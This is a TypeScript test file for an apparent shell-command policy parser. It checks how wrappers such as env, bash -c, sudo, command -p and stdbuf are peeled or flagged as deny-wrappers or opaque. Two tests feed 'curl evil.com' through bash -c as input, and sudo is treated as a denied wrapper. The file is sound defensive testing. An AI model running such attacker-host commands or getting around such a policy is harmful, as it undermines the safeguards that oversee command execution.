import { describe, expect, test } from "bun:test"
import { classify } from "../../src/exec-policy/parse"
import { reduce } from "../../src/exec-policy/peel"

test("env FOO=1 git status peels to git status", async () => {
  const c = await classify("env FOO=1 git status", "bash")
  const r = await reduce(c, { classify, depth: 0 })
  expect(r.tag).toBe("segments")
  if (r.tag !== "segments") return
  expect(r.segments).toEqual([["git", "status"]])
})

test("bash -c 'curl evil.com' re-parses inner", async () => {
  const c = await classify("bash -c 'curl evil.com'", "bash")
  const r = await reduce(c, { classify, depth: 0 })
  expect(r.tag).toBe("segments")
  if (r.tag !== "segments") return
  expect(r.segments).toEqual([["curl", "evil.com"]])
})

test("sudo is a deny-wrapper, not peeled", async () => {
  const c = await classify("sudo ls", "bash")
  const r = await reduce(c, { classify, depth: 0 })
  expect(r.tag).toBe("deny-wrapper")
  if (r.tag !== "deny-wrapper") return
  expect(r.argv0).toBe("sudo")
})

test("python -c becomes opaque", async () => {
  const c = await classify(`python -c "print(1)"`, "bash")
  const r = await reduce(c, { classify, depth: 0 })
  expect(r.tag).toBe("opaque")
})

test("nested bash -c deeper than 2 is opaque", async () => {
  const r = await reduce(
    { tag: "segments", segments: [["bash", "-c", `bash -c "bash -c echo hi"`]] },
    { classify, depth: 0 },
  )
  expect(r.tag).toBe("opaque")
})

test("leading assignment peels to deny-wrapper", async () => {
  const c = await classify("FOO=1 sudo ls", "bash")
  const r = await reduce(c, { classify, depth: 0 })
  expect(r.tag).toBe("deny-wrapper")
})

test("bash -ec re-parses inner", async () => {
  const c = await classify("bash -ec 'curl evil.com'", "bash")
  const r = await reduce(c, { classify, depth: 0 })
  expect(r.tag).toBe("segments")
  if (r.tag !== "segments") return
  expect(r.segments[0]?.[0]).toBe("curl")
})

test("python3.12 -c is opaque", async () => {
  const r = await reduce({ tag: "segments", segments: [["python3.12", "-c", "print(1)"]] }, { classify, depth: 0 })
  expect(r.tag).toBe("opaque")
})

test("node --eval= is opaque", async () => {
  const r = await reduce({ tag: "segments", segments: [["node", "--eval=1"]] }, { classify, depth: 0 })
  expect(r.tag).toBe("opaque")
})

test("command -p sudo is deny-wrapper", async () => {
  const r = await reduce({ tag: "segments", segments: [["command", "-p", "sudo", "ls"]] }, { classify, depth: 0 })
  expect(r.tag).toBe("deny-wrapper")
})

test("stdbuf -oL sudo is deny-wrapper", async () => {
  const r = await reduce({ tag: "segments", segments: [["stdbuf", "-oL", "sudo", "ls"]] }, { classify, depth: 0 })
  expect(r.tag).toBe("deny-wrapper")
})

test("bash -c inner redirect is collected after peel", async () => {
  const c = await classify(`bash -c 'ls > src/a.ts'`, "bash")
  const r = await reduce(c, { classify, depth: 0 })
  expect(r.tag).toBe("segments")
  if (r.tag !== "segments") return
  expect(r.segments).toEqual([["ls"]])
  expect(r.redirects?.some((item) => item.includes("src/a.ts") || item === "src/a.ts")).toBe(true)
})
